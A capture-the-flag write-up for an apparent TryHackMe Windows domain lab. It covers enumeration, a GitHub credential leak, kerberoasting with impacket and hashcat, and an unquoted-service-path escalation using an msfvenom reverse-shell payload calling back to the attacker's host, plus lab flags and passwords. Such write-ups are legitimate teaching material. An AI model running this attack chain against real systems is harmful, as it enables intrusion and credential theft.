### IP
`10.10.238.185`

# Reconnaissance

### nmap

`nmap -sC -sV 10.10.238.185`
```
Nmap scan report for 10.10.238.185
Host is up (0.15s latency).
Not shown: 986 closed ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html).
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-12-29 10:01:35Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: LAB-ENTERPRISE
|   NetBIOS_Domain_Name: LAB-ENTERPRISE
|   NetBIOS_Computer_Name: LAB-DC
|   DNS_Domain_Name: LAB.ENTERPRISE.THM
|   DNS_Computer_Name: LAB-DC.LAB.ENTERPRISE.THM
|   DNS_Tree_Name: ENTERPRISE.THM
|   Product_Version: 10.0.17763
|_  System_Time: 2022-12-29T10:03:56+00:00
| ssl-cert: Subject: commonName=LAB-DC.LAB.ENTERPRISE.THM
| Not valid before: 2022-12-28T09:58:40
|_Not valid after:  2023-06-29T09:58:40
|_ssl-date: 2022-12-29T10:04:10+00:00; 0s from scanner time.
5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7990/tcp  open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Log in to continue - Log in with Atlassian account
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49703/tcp open  msrpc         Microsoft Windows RPC
49712/tcp open  msrpc         Microsoft Windows RPC
49836/tcp open  msrpc         Microsoft Windows RPC

1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=12/29%Time=63AD6583%P=x86_64-pc-linux-gnu%r(DNS
SF:VersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version
SF:\x04bind\0\0\x10\0\x03");
Service Info: Host: LAB-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-12-29T10:03:58
|_  start_date: N/A


```

I initially didn't do a full port-scan, but after not finding anything for a while, I scanned again and found some extra ports.

To make sure everything works well with kerberos, we can add the domain name to `/etc/hosts`:
```
10.10.238.185	LAB.ENTERPRISE.THM
```

### smbclient

`smbclient -L \\10.10.238.185 -N`
```
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	Docs            Disk      
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
	Users           Disk      Users Share. Do Not Touch!
```

Clearly there are some custom shares that should be looked at.

We can login:

`smbclient \\\\10.10.238.185\\Docs -U fakeusername -N`

There are two files that we can download from here:
```
  .                                   D        0  Sun Mar 14 22:47:35 2021
  ..                                  D        0  Sun Mar 14 22:47:35 2021
  RSA-Secured-Credentials.xlsx        A    15360  Sun Mar 14 22:46:54 2021
  RSA-Secured-Document-PII.docx       A    18432  Sun Mar 14 22:45:24 2021

```

We can also access the `Users` share, but I couldn't find anything useful in it.

### crackmapexec

We can bruteforce Relative IDs (RIDs):
`cme smb 10.10.238.185 -u 'randomUsername' -p '' --rid-brute`
```
SMB         10.10.238.185   445    LAB-DC           [*] Windows 10.0 Build 17763 x64 (name:LAB-DC) (domain:LAB.ENTERPRISE.THM) (signing:True) (SMBv1:False)
SMB         10.10.238.185   445    LAB-DC           [+] LAB.ENTERPRISE.THM\randomUsername: 
SMB         10.10.238.185   445    LAB-DC           [+] Brute forcing RIDs
SMB         10.10.238.185   445    LAB-DC           500: LAB-ENTERPRISE\Administrator (SidTypeUser)
SMB         10.10.238.185   445    LAB-DC           501: LAB-ENTERPRISE\Guest (SidTypeUser)
SMB         10.10.238.185   445    LAB-DC           502: LAB-ENTERPRISE\krbtgt (SidTypeUser)
SMB         10.10.238.185   445    LAB-DC           512: LAB-ENTERPRISE\Domain Admins (SidTypeGroup)
SMB         10.10.238.185   445    LAB-DC           513: LAB-ENTERPRISE\Domain Users (SidTypeGroup)
SMB         10.10.238.185   445    LAB-DC           514: LAB-ENTERPRISE\Domain Guests (SidTypeGroup)
SMB         10.10.238.185   445    LAB-DC           515: LAB-ENTERPRISE\Domain Computers (SidTypeGroup)
SMB         10.10.238.185   445    LAB-DC           516: LAB-ENTERPRISE\Domain Controllers (SidTypeGroup)
SMB         10.10.238.185   445    LAB-DC           517: LAB-ENTERPRISE\Cert Publishers (SidTypeAlias)
SMB         10.10.238.185   445    LAB-DC           520: LAB-ENTERPRISE\Group Policy Creator Owners (SidTypeGroup)
SMB         10.10.238.185   445    LAB-DC           521: LAB-ENTERPRISE\Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.238.185   445    LAB-DC           522: LAB-ENTERPRISE\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.10.238.185   445    LAB-DC           525: LAB-ENTERPRISE\Protected Users (SidTypeGroup)
SMB         10.10.238.185   445    LAB-DC           526: LAB-ENTERPRISE\Key Admins (SidTypeGroup)
SMB         10.10.238.185   445    LAB-DC           553: LAB-ENTERPRISE\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.238.185   445    LAB-DC           571: LAB-ENTERPRISE\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.10.238.185   445    LAB-DC           572: LAB-ENTERPRISE\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.10.238.185   445    LAB-DC           1000: LAB-ENTERPRISE\atlbitbucket (SidTypeUser)
SMB         10.10.238.185   445    LAB-DC           1001: LAB-ENTERPRISE\LAB-DC$ (SidTypeUser)
SMB         10.10.238.185   445    LAB-DC           1102: LAB-ENTERPRISE\DnsAdmins (SidTypeAlias)
SMB         10.10.238.185   445    LAB-DC           1103: LAB-ENTERPRISE\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.238.185   445    LAB-DC           1104: LAB-ENTERPRISE\ENTERPRISE$ (SidTypeUser)
SMB         10.10.238.185   445    LAB-DC           1106: LAB-ENTERPRISE\bitbucket (SidTypeUser)
SMB         10.10.238.185   445    LAB-DC           1107: LAB-ENTERPRISE\nik (SidTypeUser)
SMB         10.10.238.185   445    LAB-DC           1108: LAB-ENTERPRISE\replication (SidTypeUser)
SMB         10.10.238.185   445    LAB-DC           1109: LAB-ENTERPRISE\spooks (SidTypeUser)
SMB         10.10.238.185   445    LAB-DC           1110: LAB-ENTERPRISE\korone (SidTypeUser)
SMB         10.10.238.185   445    LAB-DC           1111: LAB-ENTERPRISE\banana (SidTypeUser)
SMB         10.10.238.185   445    LAB-DC           1112: LAB-ENTERPRISE\Cake (SidTypeUser)
SMB         10.10.238.185   445    LAB-DC           1113: LAB-ENTERPRISE\Password-Policy-Exemption (SidTypeGroup)
SMB         10.10.238.185   445    LAB-DC           1114: LAB-ENTERPRISE\Contractor (SidTypeGroup)
SMB         10.10.238.185   445    LAB-DC           1115: LAB-ENTERPRISE\sensitive-account (SidTypeGroup)
SMB         10.10.238.185   445    LAB-DC           1116: LAB-ENTERPRISE\contractor-temp (SidTypeUser)
SMB         10.10.238.185   445    LAB-DC           1117: LAB-ENTERPRISE\varg (SidTypeUser)
SMB         10.10.238.185   445    LAB-DC           1118: LAB-ENTERPRISE\adobe-subscription (SidTypeGroup)
SMB         10.10.238.185   445    LAB-DC           1119: LAB-ENTERPRISE\joiner (SidTypeUser)
```

We get a list of users:
```
atlbitbucket
bitbucket
nik
spooks
korone
banana
Cake
varg
joiner
...
```

### gobuster
gobuster dir -u http://10.10.238.185/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x txt
```
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.238.185/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Extensions:              txt
[+] Timeout:                 10s
===============================================================
2022/12/29 06:03:04 Starting gobuster in directory enumeration mode
===============================================================
/robots.txt           (Status: 200) [Size: 110]
/Robots.txt           (Status: 200) [Size: 110]
===============================================================
2022/12/29 06:21:51 Finished
===============================================================

```

### OSINT

Port `7990` on the DC links to an atlassian page that says they have moved to Github.

Looking up `"ENTERPRISE-THM" site:github.com` on google, [this](https://github.com/Enterprise-THM) link to their github organization shows up as the first result. 

Cloning the repo shows us only two commits, neither of which have anything useful.

However, the `People` tab links to a user: [Nik-enterprise-dev](https://github.com/Nik-enterprise-dev)

This user has a repo with a file labeled [SystemInfo.ps1](https://github.com/Nik-enterprise-dev/mgmtScript.ps1/blob/main/SystemInfo.ps1):

While the latest commit does not have any credentials, the first one does:


```powershell
Import-Module ActiveDirectory
$userName = 'nik'
$userPassword = 'ToastyBoi!'
$psCreds = ConvertTo-SecureString $userPassword -AsPlainText -Force
$Computers = New-Object -TypeName "System.Collections.ArrayList"
$Computer = $(Get-ADComputer -Filter * | Select-Object Name)
for ($index = -1; $index -lt $Computer.count; $index++) { Invoke-Command -ComputerName $index {systeminfo} }
```
Based on the info from msrpc, we know the domain is `LAB-ENTERPRISE`


We now have a set of credentials: `LAB-ENTERPRISE\nik:ToastyBoi!`

I tried these credentials over RDP and they appeared to be correct, but we were unable to login


### ldapsearch

`ldapsearch -x -h enterprise.thm -s base namingcontexts`
```
namingcontexts: CN=Configuration,DC=ENTERPRISE,DC=THM
namingcontexts: CN=Schema,CN=Configuration,DC=ENTERPRISE,DC=THM
namingcontexts: DC=ForestDnsZones,DC=ENTERPRISE,DC=THM
namingcontexts: DC=LAB,DC=ENTERPRISE,DC=THM
namingcontexts: DC=DomainDnsZones,DC=LAB,DC=ENTERPRISE,DC=THM
```
We can use the namingcontext to make a query

Now that we have credentials, we can try to enumerate ldap:

`ldapsearch -h enterprise.thm -D 'nik' -w 'ToastyBoi!' -b 'DC=LAB,DC=ENTERPRISE,DC=THM' > LDAP_DUMP.txt`


This reveals a note in the `Contractor` user:

```
# Contractor, Employees, Staff, LAB.ENTERPRISE.THM
dn: CN=Contractor,OU=Employees,OU=Staff,DC=LAB,DC=ENTERPRISE,DC=THM
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Contractor
description: Change password from Password123!
givenName: Contractor
distinguishedName: CN=Contractor,OU=Employees,OU=Staff,DC=LAB,DC=ENTERPRISE,DC
 =THM
instanceType: 4
whenCreated: 20210312034427.0Z
whenChanged: 20210312034517.0Z
displayName: Contractor
uSNCreated: 32933
memberOf: CN=sensitive-account,CN=Builtin,DC=LAB,DC=ENTERPRISE,DC=THM
memberOf: CN=Contractor,CN=Builtin,DC=LAB,DC=ENTERPRISE,DC=THM
memberOf: CN=Password-Policy-Exemption,CN=Builtin,DC=LAB,DC=ENTERPRISE,DC=THM
uSNChanged: 32939
name: Contractor
objectGUID:: gGTXA/CA+0+f2JXsAcO8Uw==
userAccountControl: 66048
badPwdCount: 0
```
Namely, `description: Change password from Password123!`

This means we can try to log in to `Contractor`, and maybe do some password spraying with `Password123!` (This is something that I tried to do but I wasn't able to find any account or service that accepted that password)

We can also see that the only non-admin user that can log in remotely is `bitbucket`, as it has `memberOf: CN=Remote Desktop Users`

# Exploitation

### Kerberoasting

Because we have credentials for a user account in the domain, we can use the following command to get users with Service Principal Names
`impacket-GetUserSPNs 'LAB.ENTERPRISE.THM/nik:ToastyBoi!'`
```
ServicePrincipalName  Name       MemberOf                                                     PasswordLastSet             LastLogon                   Delegation 
--------------------  ---------  -----------------------------------------------------------  --------------------------  --------------------------  ----------
HTTP/LAB-DC           bitbucket  CN=sensitive-account,CN=Builtin,DC=LAB,DC=ENTERPRISE,DC=THM  2021-03-11 20:20:01.333272  2021-04-26 11:16:41.570158       
```


We can then request a TGS with the command
`impacket-GetUserSPNs 'LAB.ENTERPRISE.THM/nik:ToastyBoi!' -request`
```
ServicePrincipalName  Name       MemberOf                                                     PasswordLastSet             LastLogon                   Delegation 
--------------------  ---------  -----------------------------------------------------------  --------------------------  --------------------------  ----------
HTTP/LAB-DC           bitbucket  CN=sensitive-account,CN=Builtin,DC=LAB,DC=ENTERPRISE,DC=THM  2021-03-11 20:20:01.333272  2021-04-26 11:16:41.570158             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*bitbucket$LAB.ENTERPRISE.THM$LAB.ENTERPRISE.THM/bitbucket*$6a5957c1aea1539310604f5e9bcc954a$dc521a32840be1c49678ca92e1b0bee4960a9bea5f8313cfe71df1514419406c6367a69e02e280ab5bcc1d3f5bc5c7d16e96fb24921cde5d03b64b065c8ccef391e6720f20e7a98af3d425300b0389db6be28633b4cbfd32b02facbb8f4960ec21eb35e203453fd85bb086e8c6439754464e16bd4841f7f6de7afaa50ac5e2cff04e20e60908d10175bb28a539122efa57456d18e7a90224b2c9666b6054f3e02362d8fbe79b627751f17137c39560ea923eb5ed0a6bf9f1c17c59ccf7d902093aa2ffa5681c34bb0bf1bb91a529a290bc6597f57e4b9ae5e3d77dfce7c04537058859f27811c4610bdf0f9509709db381d58157c428b056c98581a78f62de55e3b297c073283111cd5d65638f7bff6c170d0894386a3a7a745acd81c3d0650492b5447bab80a88bd3613e28b6d19473e06f9ee47a25b070044d85fb82341b4224efafa9210052e3e0dae4bfebb35ab7c80c7493da63d29f401e2eab6e22299bbdcdf5f9b00b3e022cacd0039d5cd9b3858a3e0be3424b68bcb17c1c3e33c03e0e1bb615ab043c2ee6a8a6fcb3dfdc5afee2185f19f1dd1d2416389ebca5fe2a93da873bb033e50bf9011196e77af0d16f5c482529370627dc885da341822796f73f1b788c647e7abb7e1e71f18830686ef91e31aa786f1d4666270baa225a9e9a86b68c0aa46186eaa0fc31b5e39edc6dbf8f2a5f57720003bf1693bd989653ce5eab0d6966c9be69c90df79d270bbcc5cf3ed55ea0c51cc0d4486e6cc1965a9af4f8e10b423fbcb8e8573604ef00f10c594c11aed428dd7bd4377c2e5072947be8104eab1d1b2ba70170ce017ae36ea011b885952e8e30c90c0965b997590b0bc616a24436a2da16f5f7c9cb3744432f33fe3d91e7e3cc6b8be73e7b41e1d52977eef6a530eee6e2fe1712d0a5a2dd532cd2a706c2ff68c86f61b4f63714b3c93e0566705ce5e274934fd65f1aaa22314e800a9552063dba4b9420ea1a62325de8490a41a9a3cd7422b4e562ccaec590c27f1a19732122058f0604b7f8ca8b836c818d1767873140eb225bdab42e62b2e8099e63e50f35c69d40492f92889f9cb6d3925a321f770df2133164fa83151bff747cf969d2fc57c163c93fa2d2cad1d78873707728f08cae5033c73effe3e0e0b52077507045cc86cc6e1e74968e13c27fbc8e9fcdb06f2c9495403357344872f398e3f436307fddf411713ead37126934f931e2ba2d13a90d5dc41c4d06084adc586388534932aface44ed4207bdcc47467cc6d6cd490ea912eabec0aedf68be3b926514fed346c360ff3e964cba51429605e23141524dadde766af1e7c5975a9ff6a73054461391f7806497884afc866
```

We can then crack this to get a password

### hashcat

Pasting the hash into `bitbucket.hash` and running `hashcat bitbucket.hash /usr/share/wordlists/rockyou.txt` gives us the the password:

`bitbucket:littleredbucket`

Luckily for us, this is the only non-admin account that we can RDP into. 

### rdp

We can rdp in with `rdesktop -d lab-enterprise -u bitbucket -p "littleredbucket" lab.enterprise.thm`

The user flag is on the desktop: `THM{ed882d02b34246536ef7da79062bef36}`


# Privilege Escalation

### PowerSploit

We can check in the settings to see if Windows AV is enabled, and it looks like it isn't.

We can modify the rdesktop command to include a shared folder with PowerUp.ps1:

`rdesktop -r disk:tmp=./RDP-d lab-enterprise -u bitbucket -p "littleredbucket" lab.enterprise.thm`

We can access this file on the machine by going into powershell and running `cd \\tsclient\tmp`

To run PowerUp, we first have to import it:

`Import-Module .\PowerUp.ps1`


We can then run `Invoke-AllChecks` to look for ways to privesc

```
ServiceName    : zerotieroneservice
Path           : C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier One.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\Zero Tier; IdentityReference=BUILTIN\Users; Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'zerotieroneservice' -Path <HijackPath>
CanRestart     : True
Name           : zerotieroneservice
Check          : Unquoted Service Paths

ServiceName                     : gupdatem
Path                            : "C:\Program Files (x86)\Google\Update\GoogleUpdate.exe" /medsvc
ModifiableFile                  : C:\
ModifiableFilePermissions       : AppendData/AddSubdirectory
ModifiableFileIdentityReference : BUILTIN\Users
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'gupdatem'
CanRestart                      : False
Name                            : gupdatem
Check                           : Modifiable Service Files

ModifiablePath    : C:\Users\bitbucket\AppData\Local\Microsoft\WindowsApps
IdentityReference : LAB-ENTERPRISE\bitbucket
Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
%PATH%            : C:\Users\bitbucket\AppData\Local\Microsoft\WindowsApps
Name              : C:\Users\bitbucket\AppData\Local\Microsoft\WindowsApps
Check             : %PATH% .dll Hijacks
AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\bitbucket\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'

DefaultDomainName    : LAB-ENTERPRISE
DefaultUserName      : Administrator
DefaultPassword      : 
AltDefaultDomainName : 
AltDefaultUserName   : 
AltDefaultPassword   : 
Check                : Registry Autologons

```


### Unquoted Service Paths

There is a service running called `zerotieroneservice`



#### Background

Unquoted service paths are a problem when the path has spaces in it because of the specific way that Windows tries to resolve the path.

In this case, the path of the service is `C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier One.exe`

Here, when the service is executed, Windows looks in the following paths when trying to execute:

1. `C:\Program.exe`
2. `C:\Program Files (x86)\Zero.exe`
3. `C:\Program Files (x86)\Zero Tier\Zero.exe`
4. `C:\Program Files (x86)\Zero Tier\Zero Tier One\Zerotier.exe`
5. `C:\Program Files (x86)\Zero Tier\Zero Tier One\Zerotier One.exe`

Thus, we just need to find a writeable path and put our payload there.

I noticed that `C:\Program Files (x86)\Zero Tier\Zero Tier One\` was writeable, so I put my payload there in `Zerotier.exe`

#### Payload Generation

Running `systeminfo` on the machine shows that it is 64-bit windows machine.

Thus, we can generate a payload with a tcp reverse shell with the following command:

	`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.6.0.114 LPORT=1337 -f exe > Zerotier.exe`

We can upload this payload the same way as before by putting it in the shared `RDP` directory 

This should go in `C:\Program Files (x86)\Zero Tier\Zero Tier One\Zerotier.exe`

#### Payload Execution

When we look at the "Zero Tier One Service" information with `sc qc "zerotieroneservice"` in cmd.exe, we can see the following information:

```
SERVICE_NAME: zerotieroneservice
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier One.exe
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : zerotieroneservice
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
```


`AUTO_START` indicates that this will start automatically on boot. 
`LocalSystem` indicates that this will start as the system user, which has admin access.

Thus, we can start a listener for the reverse shell on our local machine:
	`nc -lvnp 13367`

You can also get a (somewhat) interactive reverse shell with
	`rlwrap nc -lvnp 1337`

When we run `Start-Service zerotieroneservice` on the machine, we get a reverse shell.
`whoami` shows `nt authority\system`

The root flag is on the Administrator's desktop: `THM{1a1fa94875421296331f145971ca4881}`
